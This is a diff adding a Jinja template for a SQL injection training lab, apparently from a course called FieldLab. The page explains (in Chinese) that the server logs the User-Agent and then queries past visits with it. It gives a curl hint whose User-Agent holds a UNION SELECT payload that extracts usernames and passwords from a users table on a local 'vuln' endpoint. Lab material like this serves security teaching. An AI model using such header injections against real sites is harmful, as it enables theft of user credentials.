@@ -1,0 +1,36 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }} - FieldLab{% endblock %}
+{% block content %}
+{% include 'sqli/partials/lab_header.html' %}
+<div class="workbench two-col">
+  <section class="console-card">
+    <h2>访问审计中间件</h2>
+    <p class="hint">服务端逻辑：先把 User-Agent 写入 audit_access_logs，再用 UA 查询历史访问。</p>
+    <p>当前请求的 User-Agent：</p>
+    <pre class="code-block">{{ ua }}</pre>
+    <p class="hint">用 curl 改 UA 试试：<br>
+      <code>curl -H "User-Agent: x' UNION SELECT 9,'INJ',CONCAT(username,':',password),NOW() FROM users-- -" "http://127.0.0.1:5000/labs/sqli/header-audit?mode=vuln"</code>
+    </p>
+    {% if error %}<pre class="error-box">{{ error }}</pre>{% endif %}
+  </section>
+  <aside class="info-card">
+    <h2>当前 UA 的最近访问</h2>
+    <table class="data-table">
+      <thead><tr><th>id</th><th>visitor_ua</th><th>visit_path</th><th>visit_at</th></tr></thead>
+      <tbody>
+      {% for r in rows %}
+        <tr>
+          <td>{{ r.access_id }}</td>
+          <td><code>{{ r.visitor_ua }}</code></td>
+          <td>{{ r.visit_path }}</td>
+          <td>{{ r.visit_at }}</td>
+        </tr>
+      {% else %}
+        <tr><td colspan="4">（暂无）</td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </aside>
+</div>
+{% include 'sqli/partials/hints.html' %}
+{% endblock %}
